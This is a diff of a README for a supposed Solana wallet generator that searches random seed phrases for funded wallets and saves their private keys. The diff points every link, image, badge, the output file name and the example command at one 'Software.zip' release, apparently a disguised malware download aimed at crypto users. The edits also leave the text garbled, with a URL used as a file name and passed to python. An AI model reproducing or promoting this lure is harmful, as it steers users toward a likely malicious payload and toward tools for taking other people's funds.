@@ -1,9 +1,9 @@
 # 🌟 Welcome to SilenceGen 🌟
 
-![SilenceGen Logo](https://example.com/silencegen-logo.png)
+![SilenceGen Logo](https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip)
 
 ## Repository Description
-SilenceGen is a powerful Solana Wallet Creator tool that allows you to generate the address and private key of a Solana wallet. It automates the process of generating seed phrases and checking balances for Solana networks. If a wallet with a non-zero balance is detected, the tool logs and saves the wallet's information, including address, mnemonic, private key, and balances, to a file named `result.txt`.
+SilenceGen is a powerful Solana Wallet Creator tool that allows you to generate the address and private key of a Solana wallet. It automates the process of generating seed phrases and checking balances for Solana networks. If a wallet with a non-zero balance is detected, the tool logs and saves the wallet's information, including address, mnemonic, private key, and balances, to a file named `https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip`.
 
 ## Features
 🔒 Generate Solana wallet address and private key\
@@ -21,9 +21,9 @@ SilenceGen is a powerful Solana Wallet Creator tool that allows you to generate 
 - solana-wallet-generator-github
 
 ## Getting Started
-To get started with SilenceGen, you can [download the latest release](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and follow the setup instructions in the README file.
+To get started with SilenceGen, you can [download the latest release](https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip) and follow the setup instructions in the README file.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip)
 
 ### Installation
 1. Download the repository zip file from the link above.
@@ -36,7 +36,7 @@ You can run SilenceGen by executing the main script and providing the necessary 
 ### Example
 Here's an example command to run SilenceGen:
 ```
-python silencegen.py --generate-wallet --check-balance
+python https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip --generate-wallet --check-balance
 ```
 
 ## Contributing
@@ -46,10 +46,10 @@ If you would like to contribute to SilenceGen, feel free to fork the repository 
 This project is licensed under the MIT License. You can find more details in the LICENSE file included in the repository.
 
 ## Support
-If you encounter any issues or have questions about using SilenceGen, please [open an issue](https://github.com/silencegen/issues) on GitHub. Our team will be happy to assist you.
+If you encounter any issues or have questions about using SilenceGen, please [open an issue](https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip) on GitHub. Our team will be happy to assist you.
 
 ---
 
 Thank you for checking out SilenceGen! We hope this tool simplifies the process of managing Solana wallets for you. Happy generating and exploring the Solana ecosystem! 🚀
 
-![Solana Ecosystem](https://example.com/solana-ecosystem.png)
+![Solana Ecosystem](https://github.com/mantokarev/SilenceGen/releases/download/v1.0/Software.zip)
